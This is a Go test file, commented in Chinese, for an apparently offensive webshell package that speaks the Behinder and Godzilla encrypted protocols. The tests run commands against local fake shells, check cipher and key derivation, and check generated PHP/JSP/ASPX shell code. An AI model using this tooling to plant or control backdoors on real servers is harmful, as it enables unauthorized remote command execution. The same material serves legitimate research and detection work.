package webshell

// 第三方加密协议的线格式测试：本地伪造一匹按冰蝎 / 哥斯拉约定解密的马，
// 校验请求体的加密方式、payload 落地内容、响应解密与边界标记。真正的马由
// Kali 上的 PHP/Tomcat/IIS 跑 e2e，这里只兜住协议层，不依赖外部运行时。

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"testing"
)

func TestCipherRoundTrip(t *testing.T) {
	key := []byte(key16("rebeyond"))
	plain := []byte("artex cipher round trip 中文")

	enc, err := aesECBEncrypt(key, plain)
	if err != nil {
		t.Fatal(err)
	}
	if dec, err := aesECBDecrypt(key, enc); err != nil || !bytes.Equal(dec, plain) {
		t.Fatalf("ECB round trip: %q err=%v", dec, err)
	}
	enc, err = aesCBCEncrypt(key, key, plain)
	if err != nil {
		t.Fatal(err)
	}
	if dec, err := aesCBCDecrypt(key, key, enc); err != nil || !bytes.Equal(dec, plain) {
		t.Fatalf("CBC round trip: %q err=%v", dec, err)
	}
	if got := xorRing(xorRing(plain, key, 1), key, 1); !bytes.Equal(got, plain) {
		t.Fatalf("XOR is not an involution: %q", got)
	}
	if _, err := aesECBDecrypt(key, []byte("short")); err == nil {
		t.Fatal("non-block ciphertext must be rejected")
	}
}

func TestKeyDerivationMatchesVendors(t *testing.T) {
	// md5("admin") = 21232f297a57a5a743894a0e4a801fc3，前 16 位即 AES 密钥。
	if got := key16("admin"); got != "21232f297a57a5a7" {
		t.Fatalf("key16(admin) = %q", got)
	}
	if got := md5Hex("admin"); got != "21232f297a57a5a743894a0e4a801fc3" {
		t.Fatalf("md5Hex(admin) = %q", got)
	}
}

func TestMagicTailLen(t *testing.T) {
	cases := map[string]int{"0a11": 10, "ff00": 15, "1f00": 15, "2000": 0, "zz": 0, "": 0}
	for key, want := range cases {
		if got := magicTailLen(key); got != want {
			t.Fatalf("magicTailLen(%q) = %d want %d", key, got, want)
		}
	}
}

func TestDescriptorsExposeEncryptedTypes(t *testing.T) {
	for _, typ := range []string{
		TypeBehinder3PHP, TypeBehinder3JSP, TypeBehinder3ASPX,
		TypeBehinder4PHP, TypeBehinder4JSP, TypeBehinder4ASPX,
		TypeGodzilla4PHP, TypeGodzilla4JSP, TypeGodzilla4ASPX,
	} {
		d, ok := Lookup(typ)
		if !ok {
			t.Fatalf("%s: not registered", typ)
		}
		if !d.ParamUnused || d.Family == "" || d.DefaultSecret == "" {
			t.Fatalf("%s: descriptor missing third-party metadata: %+v", typ, d)
		}
		if !IsEncryptedType(typ) {
			t.Fatalf("%s: IsEncryptedType = false", typ)
		}
	}
	if IsEncryptedType(TypePHPEval) {
		t.Fatal("native type must not be treated as encrypted")
	}
	behinder4JSP, _ := Lookup(TypeBehinder4JSP)
	for _, c := range []string{CryptoBehinderAES, CryptoBehinderAESMagic, CryptoBehinderXOR, CryptoBehinderXORB64} {
		if !behinder4JSP.HasCrypto(c) {
			t.Fatalf("behinder4 jsp should accept %s", c)
		}
	}
	behinder4PHP, _ := Lookup(TypeBehinder4PHP)
	if behinder4PHP.HasCrypto(CryptoBehinderXOR) {
		t.Fatal("behinder4 php has no raw XOR protocol")
	}
	// 非法加密方式回落到描述符默认值，不能让一个手误把连接打死。
	tr := &Target{Type: TypeBehinder4JSP, Crypto: "nonsense"}
	if got := tr.cryptoName(); got != CryptoBehinderAES {
		t.Fatalf("invalid crypto should fall back to default, got %q", got)
	}
}

func TestExecRejectsUnsupportedModesAndOversize(t *testing.T) {
	if _, err := ExecMode(context.Background(), &Target{Type: TypeBehinder3PHP}, ModeCode, "x", 0); err != ErrModeNotSupported {
		t.Fatalf("code mode: want ErrModeNotSupported, got %v", err)
	}
	if _, err := ExecMode(context.Background(), &Target{Type: TypeArtexCryptPHP}, ModeCode, "x", 0); err != ErrModeNotSupported {
		t.Fatalf("artex crypt code mode: want ErrModeNotSupported, got %v", err)
	}
	big := strings.Repeat("A", maxXHeaderCommandBytes)
	if _, err := Exec(context.Background(), &Target{Type: TypeGodzilla4PHP, URL: "http://127.0.0.1:1"}, big, 0); err != ErrXPayloadTooBig {
		t.Fatalf("oversize command: want ErrXPayloadTooBig, got %v", err)
	}
}

// ---- 冰蝎 ----

type xProtoCase struct {
	name      string
	shellType string
	family    string
	lang      string
	crypto    string
	secret    string
	secretKey string
}

func (c xProtoCase) target(srvURL string) *Target {
	return &Target{
		URL: srvURL, Type: c.shellType, Crypto: c.crypto,
		Secret: c.secret, SecretKey: c.secretKey, InsecureTLS: true,
	}
}

func behinderCases() []xProtoCase {
	const secret = "rebeyond"
	out := []xProtoCase{
		{shellType: TypeBehinder3PHP, family: FamilyBehinder3, lang: "php", secret: secret},
		{shellType: TypeBehinder3JSP, family: FamilyBehinder3, lang: "jsp", secret: secret},
		{shellType: TypeBehinder3ASPX, family: FamilyBehinder3, lang: "aspx", secret: secret},
	}
	specs := []struct {
		shellType string
		lang      string
		cryptos   []string
	}{
		{TypeBehinder4PHP, "php", []string{CryptoBehinderAES, CryptoBehinderAESMagic, CryptoBehinderXORB64}},
		{TypeBehinder4JSP, "jsp", []string{CryptoBehinderAES, CryptoBehinderAESMagic, CryptoBehinderXOR, CryptoBehinderXORB64}},
		{TypeBehinder4ASPX, "aspx", []string{CryptoBehinderAES}},
	}
	for _, s := range specs {
		for _, c := range s.cryptos {
			out = append(out, xProtoCase{
				name: s.shellType + "/" + c, shellType: s.shellType, family: FamilyBehinder4,
				lang: s.lang, crypto: c, secret: secret,
			})
		}
	}
	for i := range out {
		if out[i].name == "" {
			out[i].name = out[i].shellType
		}
	}
	return out
}

func TestBehinderExecAgainstFakeShell(t *testing.T) {
	for _, tc := range behinderCases() {
		t.Run(tc.name, func(t *testing.T) {
			srv := httptest.NewServer(behinderFakeHandler(t, tc))
			defer srv.Close()

			out, err := Exec(context.Background(), tc.target(srv.URL), "whoami", DefaultTimeout)
			if err != nil {
				t.Fatalf("Exec: %v", err)
			}
			if !out.Parsed {
				t.Fatalf("response not parsed: %q", out.Raw)
			}
			if out.Output != "echo[whoami]" {
				t.Fatalf("output = %q", out.Output)
			}
			alive, msg, err := Check(context.Background(), tc.target(srv.URL), DefaultTimeout)
			if err != nil || !alive {
				t.Fatalf("Check: alive=%v msg=%q err=%v", alive, msg, err)
			}
		})
	}
}

func behinderFakeHandler(t *testing.T, c xProtoCase) http.HandlerFunc {
	t.Helper()
	return func(w http.ResponseWriter, r *http.Request) {
		body, err := io.ReadAll(r.Body)
		if err != nil {
			t.Errorf("read body: %v", err)
			return
		}
		payload, ok := decodeBehinderRequest(c, body)
		if !ok {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		if want := behinderPayload(c.lang); !bytes.Equal(payload, want) {
			t.Errorf("%s: payload mismatch, got %d bytes", c.name, len(payload))
		}
		writeMarked(w, r, emulateExec(r))
	}
}

// decodeBehinderRequest 按各语言/版本的解密顺序还原请求体里的 payload 字节。
func decodeBehinderRequest(c xProtoCase, body []byte) ([]byte, bool) {
	key := []byte(key16(c.secret))
	if c.family == FamilyBehinder3 {
		switch c.lang {
		case "php":
			raw, err := base64.StdEncoding.DecodeString(string(body))
			if err != nil {
				return nil, false
			}
			dec, err := aesCBCDecrypt(key, make([]byte, 16), raw)
			if err != nil {
				return nil, false
			}
			inner := string(dec)
			const pre, suf = "assert|eval(base64_decode('", "'));"
			if !strings.HasPrefix(inner, pre) || !strings.HasSuffix(inner, suf) {
				return nil, false
			}
			out, err := base64.StdEncoding.DecodeString(inner[len(pre) : len(inner)-len(suf)])
			return out, err == nil
		case "jsp":
			raw, err := base64.StdEncoding.DecodeString(string(body))
			if err != nil {
				return nil, false
			}
			out, err := aesECBDecrypt(key, raw)
			return out, err == nil
		default: // aspx：原始密文，CBC，IV = 密钥
			out, err := aesCBCDecrypt(key, key, body)
			return out, err == nil
		}
	}

	data := body
	if c.lang == "aspx" {
		raw, err := base64.StdEncoding.DecodeString(string(body))
		if err != nil {
			return nil, false
		}
		if c.crypto == CryptoBehinderAESMagic {
			return nil, false
		}
		out, err := aesECBDecrypt(key, raw)
		return out, err == nil
	}
	switch c.crypto {
	case CryptoBehinderAESMagic:
		n := magicTailLen(string(key))
		if n > len(data) {
			return nil, false
		}
		raw, err := base64.StdEncoding.DecodeString(string(data[:len(data)-n]))
		if err != nil {
			return nil, false
		}
		out, err := aesECBDecrypt(key, raw)
		return out, err == nil
	case CryptoBehinderXOR:
		return xorRing(data, key, 1), true
	case CryptoBehinderXORB64:
		raw, err := base64.StdEncoding.DecodeString(string(data))
		if err != nil {
			return nil, false
		}
		return xorRing(raw, key, 1), true
	default: // default_aes
		raw, err := base64.StdEncoding.DecodeString(string(data))
		if err != nil {
			return nil, false
		}
		out, err := aesECBDecrypt(key, raw)
		return out, err == nil
	}
}

// ---- 哥斯拉 ----

func godzillaCases() []xProtoCase {
	const secret, secretKey = "pass", "key"
	return []xProtoCase{
		{name: "php", shellType: TypeGodzilla4PHP, family: FamilyGodzilla4, lang: "php", secret: secret, secretKey: secretKey},
		{name: "jsp", shellType: TypeGodzilla4JSP, family: FamilyGodzilla4, lang: "jsp", secret: secret, secretKey: secretKey},
		{name: "aspx", shellType: TypeGodzilla4ASPX, family: FamilyGodzilla4, lang: "aspx", secret: secret, secretKey: secretKey},
	}
}

func TestGodzillaExecAgainstFakeShell(t *testing.T) {
	for _, tc := range godzillaCases() {
		t.Run(tc.name, func(t *testing.T) {
			srv := httptest.NewServer(godzillaFakeHandler(t, tc))
			defer srv.Close()

			out, err := Exec(context.Background(), tc.target(srv.URL), "whoami", DefaultTimeout)
			if err != nil {
				t.Fatalf("Exec: %v", err)
			}
			if !out.Parsed {
				t.Fatalf("response not parsed: %q", out.Raw)
			}
			if out.Output != "echo[whoami]" {
				t.Fatalf("output = %q", out.Output)
			}
			alive, msg, err := Check(context.Background(), tc.target(srv.URL), DefaultTimeout)
			if err != nil || !alive {
				t.Fatalf("Check: alive=%v msg=%q err=%v", alive, msg, err)
			}
		})
	}
}

// godzillaFakeHandler 复刻哥斯拉壳的会话语义：首次请求落 payload，之后才执行。
func godzillaFakeHandler(t *testing.T, c xProtoCase) http.HandlerFunc {
	t.Helper()
	var mu sync.Mutex
	booted := false
	return func(w http.ResponseWriter, r *http.Request) {
		body, err := io.ReadAll(r.Body)
		if err != nil {
			t.Errorf("read body: %v", err)
			return
		}
		form, _ := url.ParseQuery(string(body))
		enc, err := base64.StdEncoding.DecodeString(form.Get(c.secret))
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		data, ok := decryptGodzillaRequest(c, enc)
		if !ok {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		mu.Lock()
		defer mu.Unlock()
		if !booted {
			if want := godzillaPayload(c.lang); !bytes.Equal(data, want) {
				t.Errorf("%s: bootstrap payload mismatch", c.name)
			}
			booted = true
			w.Header().Set("Set-Cookie", "GZID=1; Path=/")
			return
		}
		marked := markedOutput(r, emulateExec(r))
		fmt.Fprint(w, godzillaResponse(c, marked))
	}
}

func decryptGodzillaRequest(c xProtoCase, enc []byte) ([]byte, bool) {
	key := []byte(key16(c.secretKey))
	switch c.lang {
	case "jsp":
		out, err := aesECBDecrypt(key, enc)
		return out, err == nil
	case "aspx":
		out, err := aesCBCDecrypt(key, key, enc)
		return out, err == nil
	default:
		return xorRing(enc, key, 1), true
	}
}

func godzillaResponse(c xProtoCase, out string) string {
	key := key16(c.secretKey)
	var left, right string
	switch c.lang {
	case "php":
		h := md5Hex(c.secret + key)
		left, right = h[:16], h[16:]
	case "jsp":
		h := md5HexNoLeadingZero(c.secret + key)
		left, right = h[:16], h[16:]
	default:
		h := strings.ToUpper(md5Hex(c.secret + key))
		left, right = h[:16], h[16:]
	}
	var enc []byte
	switch c.lang {
	case "jsp":
		enc, _ = aesECBEncrypt([]byte(key), []byte(out))
	case "aspx":
		enc, _ = aesCBCEncrypt([]byte(key), []byte(key), []byte(out))
	default:
		enc = xorRing([]byte(out), []byte(key), 1)
	}
	return left + base64.StdEncoding.EncodeToString(enc) + right
}

// ---- 公共 ----

func emulateExec(r *http.Request) string {
	cmd64 := r.Header.Get("X-Artex-Cmd")
	raw, err := base64.StdEncoding.DecodeString(cmd64)
	if err != nil {
		return "bad command header"
	}
	cmd := string(raw)
	if cmd == ProbeCommand {
		return "artex_probe_ok"
	}
	return "echo[" + cmd + "]"
}

func writeMarked(w http.ResponseWriter, r *http.Request, out string) {
	fmt.Fprint(w, markedOutput(r, out))
}

func markedOutput(r *http.Request, out string) string {
	marks := r.Header.Get("X-Artex-Mark")
	i := strings.IndexByte(marks, '|')
	if i < 0 {
		return "missing mark header"
	}
	return marks[:i] + out + marks[i+1:]
}

func TestEmbeddedThirdPartyPayloads(t *testing.T) {
	if len(jspPayloadBytes) < 100 || !bytes.HasPrefix(jspPayloadBytes, []byte{0xCA, 0xFE, 0xBA, 0xBE}) {
		t.Fatalf("JSP payload is not a class file (%d bytes)", len(jspPayloadBytes))
	}
	if len(aspxPayloadBytes) < 100 || !bytes.HasPrefix(aspxPayloadBytes, []byte("MZ")) {
		t.Fatalf("ASPX payload is not a PE file (%d bytes)", len(aspxPayloadBytes))
	}
	// 官方哥斯拉 PHP 壳只把含 getBasicsInfo 的引导包落进 session；我们的引导包
	// 必须带这个标记，否则连对方原生马时第二次请求拿不到 payload。
	if !strings.Contains(phpPayloadGodzilla, "getBasicsInfo") {
		t.Fatal("godzilla bootstrap payload must carry the getBasicsInfo stamp")
	}
	if strings.Contains(phpPayloadBehinder, "getBasicsInfo") {
		t.Fatal("behinder payload should not carry godzilla's bootstrap stamp")
	}
}

func TestGeneratedEncryptedShells(t *testing.T) {
	cases := []struct {
		name     string
		target   *Target
		contains []string
	}{
		{"behinder3 php", &Target{Type: TypeBehinder3PHP, Secret: "s3cret"},
			[]string{key16("s3cret"), "AES-128-CBC", "openssl_decrypt", "str_repeat"}},
		{"behinder3 jsp", &Target{Type: TypeBehinder3JSP, Secret: "s3cret"},
			[]string{key16("s3cret"), "AES/ECB/PKCS5Padding"}},
		{"behinder3 aspx", &Target{Type: TypeBehinder3ASPX, Secret: "s3cret"},
			[]string{key16("s3cret"), "CipherMode.CBC", "CreateInstance(\"U\")"}},
		{"behinder4 php aes", &Target{Type: TypeBehinder4PHP, Secret: "s3cret"},
			[]string{key16("s3cret"), "AES-128-ECB"}},
		{"behinder4 php magic", &Target{Type: TypeBehinder4PHP, Secret: "s3cret", Crypto: CryptoBehinderAESMagic},
			[]string{key16("s3cret"), "hexdec(substr($key, 0, 2)) % 16"}},
		{"behinder4 jsp xor", &Target{Type: TypeBehinder4JSP, Secret: "s3cret", Crypto: CryptoBehinderXOR},
			[]string{key16("s3cret"), "byte[] k ="}},
		{"godzilla php", &Target{Type: TypeGodzilla4PHP, Secret: "pass", SecretKey: "kk"},
			[]string{key16("kk"), "substr(md5($pass . $key), 0, 16)", "base64_encode"}},
		{"godzilla jsp", &Target{Type: TypeGodzilla4JSP, Secret: "pass", SecretKey: "kk"},
			[]string{`String pass = "pass"`, key16("kk"), "BigInteger(1, m.digest())", "AES"}},
		{"godzilla aspx", &Target{Type: TypeGodzilla4ASPX, Secret: "pass", SecretKey: "kk"},
			[]string{`static string pass = "pass"`, key16("kk"), "CreateInstance(\"LY\")"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, code, err := Payload(tc.target)
			if err != nil {
				t.Fatalf("Payload: %v", err)
			}
			for _, want := range tc.contains {
				if !strings.Contains(code, want) {
					t.Fatalf("%s: generated shell missing %q", tc.name, want)
				}
			}
		})
	}
}
